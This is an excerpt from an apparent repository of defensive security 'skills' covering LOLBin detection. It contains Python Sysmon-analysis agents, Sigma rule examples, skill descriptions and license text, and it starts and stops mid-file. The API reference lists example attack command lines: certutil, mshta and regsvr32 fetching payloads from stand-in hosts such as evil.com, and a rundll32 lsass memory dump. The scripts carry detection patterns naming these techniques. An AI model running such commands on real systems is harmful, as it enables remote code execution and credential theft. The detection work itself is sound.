        "severity": "high",
        "mitre": "T1543.003",
        "description": "Service Host spawned suspicious child process",
    },
    {
        "parents": ["explorer.exe"],
        "children": ["mshta.exe", "regsvr32.exe", "msbuild.exe", "installutil.exe",
                      "cmstp.exe", "mavinject.exe"],
        "severity": "high",
        "mitre": "T1218",
        "description": "Explorer spawned proxy execution binary",
    },
    {
        "parents": ["taskeng.exe", "taskhostw.exe"],
        "children": ["cmd.exe", "powershell.exe", "mshta.exe", "certutil.exe",
                      "wscript.exe", "cscript.exe"],
        "severity": "high",
        "mitre": "T1053.005",
        "description": "Scheduled task spawned suspicious process",
    },
]

# LOLBins that should not make outbound network connections
NETWORK_SUSPICIOUS_LOLBINS = {
    "certutil.exe", "mshta.exe", "rundll32.exe", "regsvr32.exe",
    "msbuild.exe", "installutil.exe", "bitsadmin.exe", "esentutl.exe",
    "expand.exe", "replace.exe", "cmstp.exe", "presentationhost.exe",
    "mavinject.exe",
}


def parse_sysmon_evtx(evtx_path):
    """Parse a Sysmon EVTX file and extract Event ID 1 and 3 records."""
    if not HAS_EVTX:
        print("[WARN] python-evtx not installed. Use: pip install python-evtx")
        return [], []
    process_events = []
    network_events = []
    ns = {"e": "http://schemas.microsoft.com/win/2004/08/events/event"}

    with evtx.Evtx(evtx_path) as log:
        for record in log.records():
            try:
                root = ET.fromstring(record.xml())
            except ET.ParseError:
                continue
            event_id_el = root.find(".//e:System/e:EventID", ns)
            if event_id_el is None:
                continue
            event_id = event_id_el.text

            event_data = {}
            for data_el in root.findall(".//e:EventData/e:Data", ns):
                name = data_el.get("Name", "")
                event_data[name] = data_el.text or ""

            time_el = root.find(".//e:System/e:TimeCreated", ns)
            if time_el is not None:
                event_data["UtcTime"] = time_el.get("SystemTime", "")

            computer_el = root.find(".//e:System/e:Computer", ns)
            if computer_el is not None:
                event_data["Computer"] = computer_el.text or ""

            if event_id == "1":
                process_events.append(event_data)
            elif event_id == "3":
                network_events.append(event_data)

    return process_events, network_events


def parse_sysmon_json(json_path):
    """Parse Sysmon events from a JSON lines file."""
    process_events = []
    network_events = []
    with open(json_path, "r", errors="replace") as f:
        for line in f:
            line = line.strip()
            if not line:
                continue
            try:
                event = json.loads(line)
            except json.JSONDecodeError:
                continue
            event_id = str(event.get("EventID", event.get("event_id", "")))
            if event_id == "1":
                process_events.append(event)
            elif event_id == "3":
                network_events.append(event)
    return process_events, network_events


def load_events(path):
    """Load Sysmon events from EVTX or JSON file."""
    if path.lower().endswith(".evtx"):
        return parse_sysmon_evtx(path)
    elif path.lower().endswith(".json") or path.lower().endswith(".jsonl"):
        return parse_sysmon_json(path)
    else:
        # Try JSON first, fall back to EVTX
        try:
            return parse_sysmon_json(path)
        except Exception:
            return parse_sysmon_evtx(path)


def detect_lolbin_abuse(process_events):
    """Detect suspicious LOLBin command-line patterns."""
    alerts = []
    for event in process_events:
        image = event.get("Image", event.get("image", "")).lower()
        cmdline = event.get("CommandLine", event.get("command_line", ""))
        if not cmdline:
            continue

        binary_name = image.split("\\")[-1] if "\\" in image else image.split("/")[-1]

        for lolbin, config in LOLBIN_SIGNATURES.items():
            if binary_name == lolbin.lower():
                for pattern in config["patterns"]:
                    if re.search(pattern, cmdline, re.IGNORECASE):
                        alerts.append({
                            "type": "lolbin_suspicious_cmdline",
                            "severity": config["severity"],
                            "lolbin": lolbin,
                            "description": config["description"],
                            "mitre": config["mitre"],
                            "command_line": cmdline[:500],
                            "image": event.get("Image", event.get("image", "")),
                            "parent_image": event.get("ParentImage", event.get("parent_image", "")),
                            "user": event.get("User", event.get("user", "")),
                            "hostname": event.get("Computer", event.get("hostname", "")),
                            "timestamp": event.get("UtcTime", event.get("timestamp", "")),
                            "pid": event.get("ProcessId", event.get("process_id", "")),
                            "ppid": event.get("ParentProcessId", event.get("parent_process_id", "")),
                            "matched_pattern": pattern,
                        })
                        break
    return alerts


def detect_parent_child_anomalies(process_events):
    """Detect suspicious parent-child process relationships."""
    alerts = []
    for event in process_events:
        parent = event.get("ParentImage", event.get("parent_image", "")).lower()
        child = event.get("Image", event.get("image", "")).lower()
        parent_name = parent.split("\\")[-1] if "\\" in parent else parent.split("/")[-1]
        child_name = child.split("\\")[-1] if "\\" in child else child.split("/")[-1]

        for rule in PARENT_CHILD_RULES:
            if parent_name in rule["parents"] and child_name in rule["children"]:
                alerts.append({
                    "type": "suspicious_parent_child",
                    "severity": rule["severity"],
                    "mitre": rule["mitre"],
                    "description": rule["description"],
                    "parent_process": parent,
                    "child_process": child,
                    "command_line": event.get("CommandLine", event.get("command_line", ""))[:500],
                    "user": event.get("User", event.get("user", "")),
                    "hostname": event.get("Computer", event.get("hostname", "")),
                    "timestamp": event.get("UtcTime", event.get("timestamp", "")),
                })
                break
    return alerts


def detect_lolbin_network(network_events):
    """Detect LOLBins making outbound network connections."""
    alerts = []
    for event in network_events:
        image = event.get("Image", event.get("image", "")).lower()
        binary_name = image.split("\\")[-1] if "\\" in image else image.split("/")[-1]

        if binary_name in NETWORK_SUSPICIOUS_LOLBINS:
            dest_ip = event.get("DestinationIp", event.get("destination_ip", ""))
            if dest_ip.startswith("127.") or dest_ip == "::1":
                continue
            alerts.append({
                "type": "lolbin_network_connection",
                "severity": "critical",
                "binary": binary_name,
                "image": event.get("Image", event.get("image", "")),
                "destination_ip": dest_ip,
                "destination_port": event.get("DestinationPort", event.get("destination_port", "")),
                "destination_hostname": event.get("DestinationHostname", event.get("destination_hostname", "")),
                "source_ip": event.get("SourceIp", event.get("source_ip", "")),
                "user": event.get("User", event.get("user", "")),
                "hostname": event.get("Computer", event.get("hostname", "")),
                "timestamp": event.get("UtcTime", event.get("timestamp", "")),
            })
    return alerts


def generate_statistics(process_events, all_alerts):
    """Generate summary statistics."""
    lolbin_exec_counts = defaultdict(int)
    for event in process_events:
        image = event.get("Image", event.get("image", "")).lower()
        binary_name = image.split("\\")[-1] if "\\" in image else image.split("/")[-1]
        if binary_name in [k.lower() for k in LOLBIN_SIGNATURES]:
            lolbin_exec_counts[binary_name] += 1

    severity_counts = defaultdict(int)
    type_counts = defaultdict(int)
    mitre_counts = defaultdict(int)
    for alert in all_alerts:
        severity_counts[alert.get("severity", "unknown")] += 1
        type_counts[alert.get("type", "unknown")] += 1
        mitre_ids = alert.get("mitre", [])
        if isinstance(mitre_ids, str):
            mitre_ids = [mitre_ids]
        for mid in mitre_ids:
            mitre_counts[mid] += 1

    return {
        "lolbin_execution_counts": dict(lolbin_exec_counts),
        "alert_severity_counts": dict(severity_counts),
        "alert_type_counts": dict(type_counts),
        "mitre_technique_counts": dict(mitre_counts),
        "total_alerts": len(all_alerts),
    }


if __name__ == "__main__":
    print("=" * 60)
    print("Living Off the Land (LOLBin) Detection Agent")
    print("Sysmon log analysis for LOLBin abuse, parent-child")
    print("anomalies, and LOLBin network connections")
    print("=" * 60)

    input_path = sys.argv[1] if len(sys.argv) > 1 else None

    if not input_path or not os.path.exists(input_path):
        print(f"\n[DEMO] Usage: python agent.py <sysmon_events.evtx|json|jsonl>")
        print("[*] Provide Sysmon event logs (EVTX or JSON) for LOLBin analysis.")
        print(f"[*] Monitors {len(LOLBIN_SIGNATURES)} LOLBins with "
              f"{sum(len(v['patterns']) for v in LOLBIN_SIGNATURES.values())} detection patterns")
        print(f"[*] {len(PARENT_CHILD_RULES)} parent-child anomaly rules")
        print(f"[*] {len(NETWORK_SUSPICIOUS_LOLBINS)} LOLBins monitored for network activity")
        sys.exit(0)

    print(f"\n[*] Loading events from: {input_path}")
    process_events, network_events = load_events(input_path)
    print(f"  Process creation events (EID 1): {len(process_events)}")
    print(f"  Network connection events (EID 3): {len(network_events)}")

    all_alerts = []

    print("\n--- LOLBin Command-Line Detection ---")
    cmdline_alerts = detect_lolbin_abuse(process_events)
    print(f"  Suspicious LOLBin executions: {len(cmdline_alerts)}")
    for a in cmdline_alerts[:15]:
        print(f"  [{a['severity'].upper()}] {a['lolbin']} on {a.get('hostname', '?')}")
        print(f"    MITRE: {', '.join(a['mitre']) if isinstance(a['mitre'], list) else a['mitre']}")
        print(f"    Cmd: {a['command_line'][:120]}")
        print(f"    Parent: {a['parent_image']}")
        print(f"    User: {a['user']}")
    all_alerts.extend(cmdline_alerts)

    print("\n--- Parent-Child Anomaly Detection ---")
    pc_alerts = detect_parent_child_anomalies(process_events)
    print(f"  Suspicious parent-child pairs: {len(pc_alerts)}")
    for a in pc_alerts[:15]:
        print(f"  [{a['severity'].upper()}] {a['description']}")
        print(f"    Parent: {a['parent_process']} -> Child: {a['child_process']}")
        print(f"    Cmd: {a['command_line'][:120]}")
    all_alerts.extend(pc_alerts)

    print("\n--- LOLBin Network Connections ---")
    net_alerts = detect_lolbin_network(network_events)
    print(f"  LOLBin network connections: {len(net_alerts)}")
    for a in net_alerts[:15]:
        print(f"  [CRITICAL] {a['binary']} -> {a['destination_ip']}:{a['destination_port']}"
              f" ({a.get('destination_hostname', 'N/A')})")
    all_alerts.extend(net_alerts)

    stats = generate_statistics(process_events, all_alerts)

    print(f"\n{'=' * 60}")
    print(f"SUMMARY: {stats['total_alerts']} total alerts")
    for sev, count in sorted(stats["alert_severity_counts"].items()):
        print(f"  {sev.upper()}: {count}")
    if stats["mitre_technique_counts"]:
        print("\nMITRE ATT&CK techniques triggered:")
        for tech, count in sorted(stats["mitre_technique_counts"].items(), key=lambda x: -x[1]):
            print(f"  {tech}: {count}")
    if stats["lolbin_execution_counts"]:
        print("\nLOLBin execution counts:")
        for binary, count in sorted(stats["lolbin_execution_counts"].items(), key=lambda x: -x[1])[:20]:
            print(f"  {binary}: {count}")

===== END FILE =====


===== FILE: skills/detecting-living-off-the-land-with-lolbas/SKILL.md =====
---
name: detecting-living-off-the-land-with-lolbas
description: Detect Living Off the Land Binaries (LOLBins/LOLBAS) abuse including
  certutil, regsvr32, mshta, and rundll32 via process telemetry, Sigma rules, and
  parent-child process analysis with Sysmon endpoint data. Use when hunting for adversaries
  abusing built-in Windows binaries to download, execute, or proxy malicious code while
  evading traditional executable-based detection.
domain: cybersecurity
subdomain: threat-detection
tags:
- lolbas
- lolbins
- sigma-rules
- process-monitoring
- sysmon
- endpoint-detection
- threat-hunting
version: '1.0'
author: mahipal
license: Apache-2.0
d3fend_techniques:
- Executable Denylisting
- Execution Isolation
- File Metadata Consistency Validation
- Application Protocol Command Analysis
- Content Format Conversion
nist_csf:
- DE.CM-01
- DE.AE-02
- DE.AE-06
- ID.RA-05
mitre_attack:
- T1078
- T1190
- T1059
---

# Detecting Living Off the Land with LOLBAS

## Overview

Living Off the Land Binaries, Scripts, and Libraries (LOLBAS) are legitimate system utilities abused by attackers to execute malicious actions while evading detection. This skill covers detecting abuse of certutil.exe, regsvr32.exe, mshta.exe, rundll32.exe, msbuild.exe, and other LOLBins using process telemetry from Sysmon and Windows Event Logs, combined with Sigma rule-based detection.


## When to Use

- When investigating security incidents that require detecting living off the land with lolbas
- When building detection rules or threat hunting queries for this domain
- When SOC analysts need structured procedures for this analysis type
- When validating security monitoring coverage for related attack techniques

## Prerequisites

- Sysmon or Windows Security Event Log (Event ID 4688) with command-line logging enabled
- Sigma rule conversion tool (sigmac or sigma-cli)
- SIEM platform (Splunk, Elastic, or similar) for log ingestion
- Python 3.8+ with pySigma library
- LOLBAS project reference database

## Steps

1. **Establish LOLBin Watchlist** — Build a prioritized list of monitored binaries (certutil, mshta, regsvr32, rundll32, msbuild, installutil, cmstp, wmic, bitsadmin)
2. **Collect Process Telemetry** — Ingest Sysmon Event ID 1 (Process Create) and Windows 4688 events with full command-line capture
3. **Build Sigma Detection Rules** — Create Sigma rules matching suspicious command-line arguments, network activity, and parent-child process anomalies for each LOLBin
4. **Analyze Parent-Child Relationships** — Flag unexpected parent processes spawning LOLBins (e.g., Excel spawning certutil, Word spawning mshta)
5. **Score and Prioritize Alerts** — Apply risk scoring based on argument anomaly, parent process, execution path, and network indicators
6. **Generate Detection Report** — Produce a structured report of all LOLBin abuse detections with MITRE ATT&CK mapping

## Expected Output

- JSON report listing detected LOLBin abuse events with severity scores
- MITRE ATT&CK technique mapping for each detection (T1218, T1105, T1140, T1127)
- Parent-child process anomaly analysis
- Sigma rule match details with raw event data

===== END FILE =====


===== FILE: skills/detecting-living-off-the-land-with-lolbas/LICENSE =====

                                 Apache License
                           Version 2.0, January 2004
                        http://www.apache.org/licenses/

   TERMS AND CONDITIONS FOR USE, REPRODUCTION, AND DISTRIBUTION

   1. Definitions.

      "License" shall mean the terms and conditions for use, reproduction,
      and distribution as defined by Sections 1 through 9 of this document.

      "Licensor" shall mean the copyright owner or entity authorized by
      the copyright owner that is granting the License.

      "Legal Entity" shall mean the union of the acting entity and all
      other entities that control, are controlled by, or are under common
      control with that entity. For the purposes of this definition,
      "control" means (i) the power, direct or indirect, to cause the
      direction or management of such entity, whether by contract or
      otherwise, or (ii) ownership of fifty percent (50%) or more of the
      outstanding shares, or (iii) beneficial ownership of such entity.

      "You" (or "Your") shall mean an individual or Legal Entity
      exercising permissions granted by this License.

      "Source" form shall mean the preferred form for making modifications,
      including but not limited to software source code, documentation
      source, and configuration files.

      "Object" form shall mean any form resulting from mechanical
      transformation or translation of a Source form, including but
      not limited to compiled object code, generated documentation,
      and conversions to other media types.

      "Work" shall mean the work of authorship, whether in Source or
      Object form, made available under the License, as indicated by a
      copyright notice that is included in or attached to the work
      (an example is provided in the Appendix below).

      "Derivative Works" shall mean any work, whether in Source or Object
      form, that is based on (or derived from) the Work and for which the
      editorial revisions, annotations, elaborations, or other modifications
      represent, as a whole, an original work of authorship. For the purposes
      of this License, Derivative Works shall not include works that remain
      separable from, or merely link (or bind by name) to the interfaces of,
      the Work and Derivative Works thereof.

      "Contribution" shall mean any work of authorship, including
      the original version of the Work and any modifications or additions
      to that Work or Derivative Works thereof, that is intentionally
      submitted to the Licensor for inclusion in the Work by the copyright owner
      or by an individual or Legal Entity authorized to submit on behalf of
      the copyright owner. For the purposes of this definition, "submitted"
      means any form of electronic, verbal, or written communication sent
      to the Licensor or its representatives, including but not limited to
      communication on electronic mailing lists, source code control systems,
      and issue tracking systems that are managed by, or on behalf of, the
      Licensor for the purpose of discussing and improving the Work, but
      excluding communication that is conspicuously marked or otherwise
      designated in writing by the copyright owner as "Not a Contribution."

      "Contributor" shall mean Licensor and any individual or Legal Entity
      on behalf of whom a Contribution has been received by the Licensor and
      subsequently incorporated within the Work.

   2. Grant of Copyright License. Subject to the terms and conditions of
      this License, each Contributor hereby grants to You a perpetual,
      worldwide, non-exclusive, no-charge, royalty-free, irrevocable
      copyright license to reproduce, prepare Derivative Works of,
      publicly display, publicly perform, sublicense, and distribute the
      Work and such Derivative Works in Source or Object form.

   3. Grant of Patent License. Subject to the terms and conditions of
      this License, each Contributor hereby grants to You a perpetual,
      worldwide, non-exclusive, no-charge, royalty-free, irrevocable
      (except as stated in this section) patent license to make, have made,
      use, offer to sell, sell, import, and otherwise transfer the Work,
      where such license applies only to those patent claims licensable
      by such Contributor that are necessarily infringed by their
      Contribution(s) alone or by combination of their Contribution(s)
      with the Work to which such Contribution(s) was submitted. If You
      institute patent litigation against any entity (including a
      cross-claim or counterclaim in a lawsuit) alleging that the Work
      or a Contribution incorporated within the Work constitutes direct
      or contributory patent infringement, then any patent licenses
      granted to You under this License for that Work shall terminate
      as of the date such litigation is filed.

   4. Redistribution. You may reproduce and distribute copies of the
      Work or Derivative Works thereof in any medium, with or without
      modifications, and in Source or Object form, provided that You
      meet the following conditions:

      (a) You must give any other recipients of the Work or
          Derivative Works a copy of this License; and

      (b) You must cause any modified files to carry prominent notices
          stating that You changed the files; and

      (c) You must retain, in the Source form of any Derivative Works
          that You distribute, all copyright, patent, trademark, and
          attribution notices from the Source form of the Work,
          excluding those notices that do not pertain to any part of
          the Derivative Works; and

      (d) If the Work includes a "NOTICE" text file as part of its
          distribution, then any Derivative Works that You distribute must
          include a readable copy of the attribution notices contained
          within such NOTICE file, excluding any notices that do not
          pertain to any part of the Derivative Works, in at least one
          of the following places: within a NOTICE text file distributed
          as part of the Derivative Works; within the Source form or
          documentation, if provided along with the Derivative Works; or,
          within a display generated by the Derivative Works, if and
          wherever such third-party notices normally appear. The contents
          of the NOTICE file are for informational purposes only and
          do not modify the License. You may add Your own attribution
          notices within Derivative Works that You distribute, alongside
          or as an addendum to the NOTICE text from the Work, provided
          that such additional attribution notices cannot be construed
          as modifying the License.

      You may add Your own copyright statement to Your modifications and
      may provide additional or different license terms and conditions
      for use, reproduction, or distribution of Your modifications, or
      for any such Derivative Works as a whole, provided Your use,
      reproduction, and distribution of the Work otherwise complies with
      the conditions stated in this License.

   5. Submission of Contributions. Unless You explicitly state otherwise,
      any Contribution intentionally submitted for inclusion in the Work
      by You to the Licensor shall be under the terms and conditions of
      this License, without any additional terms or conditions.
      Notwithstanding the above, nothing herein shall supersede or modify
      the terms of any separate license agreement you may have executed
      with Licensor regarding such Contributions.

   6. Trademarks. This License does not grant permission to use the trade
      names, trademarks, service marks, or product names of the Licensor,
      except as required for reasonable and customary use in describing the
      origin of the Work and reproducing the content of the NOTICE file.

   7. Disclaimer of Warranty. Unless required by applicable law or
      agreed to in writing, Licensor provides the Work (and each
      Contributor provides its Contributions) on an "AS IS" BASIS,
      WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or
      implied, including, without limitation, any warranties or conditions
      of TITLE, NON-INFRINGEMENT, MERCHANTABILITY, or FITNESS FOR A
      PARTICULAR PURPOSE. You are solely responsible for determining the
      appropriateness of using or redistributing the Work and assume any
      risks associated with Your exercise of permissions under this License.

   8. Limitation of Liability. In no event and under no legal theory,
      whether in tort (including negligence), contract, or otherwise,
      unless required by applicable law (such as deliberate and grossly
      negligent acts) or agreed to in writing, shall any Contributor be
      liable to You for damages, including any direct, indirect, special,
      incidental, or consequential damages of any character arising as a
      result of this License or out of the use or inability to use the
      Work (including but not limited to damages for loss of goodwill,
      work stoppage, computer failure or malfunction, or any and all
      other commercial damages or losses), even if such Contributor
      has been advised of the possibility of such damages.

   9. Accepting Warranty or Additional Liability. While redistributing
      the Work or Derivative Works thereof, You may choose to offer,
      and charge a fee for, acceptance of support, warranty, indemnity,
      or other liability obligations and/or rights consistent with this
      License. However, in accepting such obligations, You may act only
      on Your own behalf and on Your sole responsibility, not on behalf
      of any other Contributor, and only if You agree to indemnify,
      defend, and hold each Contributor harmless for any liability
      incurred by, or claims asserted against, such Contributor by reason
      of your accepting any such warranty or additional liability.

   END OF TERMS AND CONDITIONS

   APPENDIX: How to apply the Apache License to your work.

      To apply the Apache License to your work, attach the following
      boilerplate notice, with the fields enclosed by brackets "[]"
      replaced with your own identifying information. (Don't include
      the brackets!)  The text should be enclosed in the appropriate
      comment syntax for the file format. Please do not remove or change
      the license header comment from a contributed file except when
      necessary.

   Copyright 2026 mukul975

   Licensed under the Apache License, Version 2.0 (the "License");
   you may not use this file except in compliance with the License.
   You may obtain a copy of the License at

       http://www.apache.org/licenses/LICENSE-2.0

   Unless required by applicable law or agreed to in writing, software
   distributed under the License is distributed on an "AS IS" BASIS,
   WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
   See the License for the specific language governing permissions and
   limitations under the License.

===== END FILE =====


===== FILE: skills/detecting-living-off-the-land-with-lolbas/references/api-reference.md =====
# LOLBAS Detection API Reference

## Sysmon Event ID 1 — Process Creation

Sysmon captures full command-line arguments for every new process:

```xml
<EventID>1</EventID>
<Data Name="Image">C:\Windows\System32\certutil.exe</Data>
<Data Name="CommandLine">certutil -urlcache -split -f http://evil.com/payload.exe C:\Temp\p.exe</Data>
<Data Name="ParentImage">C:\Program Files\Microsoft Office\root\Office16\WINWORD.EXE</Data>
<Data Name="User">DOMAIN\jsmith</Data>
```

## Key LOLBin Signatures

### certutil.exe (T1140, T1105)
```
certutil -urlcache -split -f http://malicious.com/file.exe output.exe
certutil -decode encoded.txt decoded.exe
certutil -encode payload.exe encoded.txt
```

### mshta.exe (T1218.005)
```
mshta http://attacker.com/malicious.hta
mshta vbscript:Execute("CreateObject(""Wscript.Shell"").Run ""cmd"":close")
```

### regsvr32.exe (T1218.010)
```
regsvr32 /s /n /u /i:http://attacker.com/file.sct scrobj.dll
```

### rundll32.exe (T1218.011)
```
rundll32.exe comsvcs.dll,MiniDump <lsass_pid> dump.bin full
rundll32.exe javascript:"\..\mshtml,RunHTMLApplication ";eval("...");
```

## Sigma Rule Format

```yaml
title: Suspicious Certutil Download
id: e011f510-fae2-4e3a-b31c-5d6c8e9faccd
status: stable
logsource:
    category: process_creation
    product: windows
detection:
    selection:
        Image|endswith: '\certutil.exe'
    condition_args:
        CommandLine|contains|all:
            - '-urlcache'
            - '-f'
            - 'http'
    condition: selection and condition_args
level: high
tags:
    - attack.t1105
    - attack.t1140
```

## Sigma CLI Conversion

```bash
# Convert Sigma rule to Splunk query
sigma convert -t splunk -p sysmon certutil_download.yml

# Convert to Elastic query
sigma convert -t elasticsearch -p ecs_windows certutil_download.yml

# Validate Sigma rule syntax
sigma check certutil_download.yml
```

## LOLBAS Project API

Browse the full LOLBin database at https://lolbas-project.github.io/

```bash
# Clone LOLBAS project for offline reference
git clone https://github.com/LOLBAS-Project/LOLBAS.git
ls LOLBAS/yml/OSBinaries/   # View all documented LOLBins
```

===== END FILE =====


===== FILE: skills/detecting-living-off-the-land-with-lolbas/scripts/agent.py =====
#!/usr/bin/env python3
"""Detect Living Off the Land Binaries (LOLBAS) abuse via process telemetry and Sigma rules."""

import json
import argparse
from datetime import datetime
from collections import defaultdict

LOLBIN_SIGNATURES = {
    "certutil.exe": {
        "suspicious_args": ["-urlcache", "-split", "-decode", "-encode", "-f http", "-verifyctl"],
        "mitre": "T1140",
        "description": "Certificate utility abused for download/decode",
    },
    "mshta.exe": {
        "suspicious_args": ["http://", "https://", "javascript:", "vbscript:", ".hta"],
        "mitre": "T1218.005",
        "description": "HTML Application host executing remote content",
    },
    "regsvr32.exe": {
        "suspicious_args": ["/s /n /u /i:http", "/i:http", "scrobj.dll", ".sct"],
        "mitre": "T1218.010",
        "description": "COM scriptlet execution via regsvr32 (Squiblydoo)",
    },
    "rundll32.exe": {
        "suspicious_args": ["javascript:", "http://", "shell32.dll,ShellExec_RunDLL", "comsvcs.dll,MiniDump"],
        "mitre": "T1218.011",
        "description": "Rundll32 proxy execution or credential dumping",
    },
    "msbuild.exe": {
        "suspicious_args": [".xml", ".csproj", "/p:", "inline task"],
        "mitre": "T1127.001",
        "description": "MSBuild inline task code execution",
    },
    "bitsadmin.exe": {
        "suspicious_args": ["/transfer", "/create", "/addfile", "/resume", "/complete"],
        "mitre": "T1197",
        "description": "BITS job used for file download or persistence",
    },
    "wmic.exe": {
        "suspicious_args": ["process call create", "/node:", "os get", "format:"],
        "mitre": "T1047",
        "description": "WMI command-line for execution or reconnaissance",
    },
    "cmstp.exe": {
        "suspicious_args": ["/ni", "/s", ".inf"],
        "mitre": "T1218.003",
        "description": "CMSTP UAC bypass with malicious INF",
    },
}

SUSPICIOUS_PARENTS = {
    "winword.exe", "excel.exe", "powerpnt.exe", "outlook.exe",
    "wmiprvse.exe", "svchost.exe", "taskeng.exe", "cmd.exe",
}


def parse_process_events(log_path):
    """Parse Sysmon or Windows 4688 process creation events from JSON log."""
    events = []
    with open(log_path) as f:
        for line in f:
            line = line.strip()
            if not line:
                continue
            try:
                event = json.loads(line)
                events.append(event)
            except json.JSONDecodeError:
                continue
    return events


def detect_lolbin_abuse(events):
    """Detect LOLBin abuse from process creation events."""
    detections = []
    for event in events:
        image = event.get("Image", event.get("NewProcessName", "")).lower()
        cmdline = event.get("CommandLine", event.get("ProcessCommandLine", "")).lower()
        parent = event.get("ParentImage", event.get("ParentProcessName", "")).lower()
        binary_name = image.rsplit("\\", 1)[-1] if "\\" in image else image.rsplit("/", 1)[-1]

        if binary_name not in LOLBIN_SIGNATURES:
            continue

        sig = LOLBIN_SIGNATURES[binary_name]
        matched_args = [arg for arg in sig["suspicious_args"] if arg.lower() in cmdline]
        if not matched_args:
            continue

        parent_name = parent.rsplit("\\", 1)[-1] if "\\" in parent else parent.rsplit("/", 1)[-1]
        parent_suspicious = parent_name in SUSPICIOUS_PARENTS

        severity = "high" if parent_suspicious else "medium"
        if len(matched_args) > 1:
            severity = "critical"

        detections.append({
            "timestamp": event.get("UtcTime", event.get("TimeCreated", datetime.utcnow().isoformat())),
            "binary": binary_name,
            "command_line": event.get("CommandLine", event.get("ProcessCommandLine", "")),
            "parent_process": parent,
            "parent_suspicious": parent_suspicious,
            "matched_signatures": matched_args,
            "mitre_technique": sig["mitre"],
            "description": sig["description"],
            "severity": severity,
            "user": event.get("User", event.get("SubjectUserName", "unknown")),
            "pid": event.get("ProcessId", event.get("NewProcessId", "")),
        })
    return detections


def generate_sigma_rule(binary_name):
    """Generate a Sigma detection rule for a specific LOLBin."""
    if binary_name not in LOLBIN_SIGNATURES:
        return None
    sig = LOLBIN_SIGNATURES[binary_name]
    rule = {
        "title": f"Suspicious {binary_name} Execution",
        "id": f"lolbas-{binary_name.replace('.exe', '')}-detection",
        "status": "experimental",
        "description": sig["description"],
        "references": ["https://lolbas-project.github.io/"],
        "logsource": {"category": "process_creation", "product": "windows"},
        "detection": {
            "selection": {"Image|endswith": f"\\{binary_name}"},
            "condition_args": {
                "CommandLine|contains": sig["suspicious_args"]
            },
            "condition": "selection and condition_args",
        },
        "falsepositives": ["Legitimate administrative use"],
        "level": "high",
        "tags": [f"attack.{sig['mitre'].lower()}"],
    }
    return rule


def build_report(detections, log_path):
    """Build structured detection report."""
    by_binary = defaultdict(list)
    for d in detections:
        by_binary[d["binary"]].append(d)

    severity_counts = defaultdict(int)
    for d in detections:
        severity_counts[d["severity"]] += 1

    return {
        "report_time": datetime.utcnow().isoformat(),
        "log_source": log_path,
        "total_detections": len(detections),
        "severity_summary": dict(severity_counts),
        "detections_by_binary": {k: len(v) for k, v in by_binary.items()},
        "mitre_techniques": list({d["mitre_technique"] for d in detections}),
        "detections": detections,
    }


def main():
    parser = argparse.ArgumentParser(description="LOLBAS Abuse Detection Agent")
    parser.add_argument("--log-file", required=True, help="JSON log file with process creation events")
    parser.add_argument("--output", default="lolbas_detections.json", help="Output report path")
    parser.add_argument("--generate-sigma", action="store_true", help="Generate Sigma rules for all LOLBins")
    args = parser.parse_args()

    events = parse_process_events(args.log_file)
    detections = detect_lolbin_abuse(events)
    report = build_report(detections, args.log_file)

    if args.generate_sigma:
        report["sigma_rules"] = {}
        for binary in LOLBIN_SIGNATURES:
            report["sigma_rules"][binary] = generate_sigma_rule(binary)

    with open(args.output, "w") as f:
        json.dump(report, f, indent=2, default=str)
    print(f"[+] Analyzed {len(events)} events, found {len(detections)} LOLBin abuse detections")
    print(f"[+] Report saved to {args.output}")


if __name__ == "__main__":
    main()

===== END FILE =====


===== FILE: skills/detecting-pass-the-ticket-attacks/SKILL.md =====
---
name: detecting-pass-the-ticket-attacks
description: Detect Kerberos Pass-the-Ticket (PtT) attacks by analyzing Windows Event IDs 4768, 4769, and 4771 for anomalous ticket usage patterns, with detection queries for Splunk and Elastic SIEM. Use when investigating incidents involving stolen or replayed Kerberos tickets, building detection rules or threat hunting queries for ticket abuse, or validating SOC monitoring coverage for credential-theft attack techniques.
domain: cybersecurity
subdomain: threat-detection
tags:
- kerberos
- pass-the-ticket
- active-directory
- splunk
- elastic
- credential-theft
- windows-security
version: '1.0'
author: mahipal
license: Apache-2.0
d3fend_techniques:
- Token Binding
- Execution Isolation
- Restore Access
- Application Protocol Command Analysis
- Process Termination
nist_csf:
- DE.CM-01
- DE.AE-02
- DE.AE-06
- ID.RA-05
mitre_attack:
- T1078
- T1190
- T1059
- T1003
- T1110
---

# Detecting Pass-the-Ticket Attacks

## Overview

Pass-the-Ticket (PtT) is a credential theft technique (MITRE ATT&CK T1550.003) where adversaries steal Kerberos tickets (TGT or TGS) from one system and replay them on another to authenticate without knowing the user's password. This skill teaches detection of PtT attacks by correlating Windows Security Event IDs 4768 (TGT request), 4769 (TGS request), and 4771 (pre-authentication failure) for anomalies such as ticket reuse across different hosts, RC4 encryption downgrades, and unusual service ticket request volumes.


## When to Use

- When investigating security incidents that require detecting pass the ticket attacks
- When building detection rules or threat hunting queries for this domain
- When SOC analysts need structured procedures for this analysis type
- When validating security monitoring coverage for related attack techniques

## Prerequisites

- Windows Domain Controller with advanced audit policy enabled (Audit Kerberos Authentication Service, Audit Kerberos Service Ticket Operations)
- Splunk or Elastic SIEM ingesting Windows Security event logs
- Sysmon deployed on endpoints for supplementary process telemetry
- Python 3.8+ with `requests` library

## Steps

1. Enable Kerberos audit logging on Domain Controllers via Group Policy
2. Forward Event IDs 4768, 4769, and 4771 to SIEM platform
3. Deploy detection rules for RC4 encryption downgrade (TicketEncryptionType 0x17)
4. Create correlation rule for ticket reuse across multiple source IPs
5. Build baseline of normal TGS request volume per user/host
6. Alert on standard deviation anomalies in ticket request patterns
7. Investigate flagged events with enrichment from Active Directory

## Expected Output

JSON report containing detected PtT indicators including anomalous ticket requests, RC4 downgrades, cross-host ticket reuse events, and risk-scored users with MITRE ATT&CK technique mapping.

===== END FILE =====


===== FILE: skills/detecting-pass-the-ticket-attacks/LICENSE =====

                                 Apache License
                           Version 2.0, January 2004
                        http://www.apache.org/licenses/

   TERMS AND CONDITIONS FOR USE, REPRODUCTION, AND DISTRIBUTION

   1. Definitions.

      "License" shall mean the terms and conditions for use, reproduction,
      and distribution as defined by Sections 1 through 9 of this document.

      "Licensor" shall mean the copyright owner or entity authorized by
      the copyright owner that is granting the License.

      "Legal Entity" shall mean the union of the acting entity and all
      other entities that control, are controlled by, or are under common
      control with that entity. For the purposes of this definition,
      "control" means (i) the power, direct or indirect, to cause the
      direction or management of such entity, whether by contract or
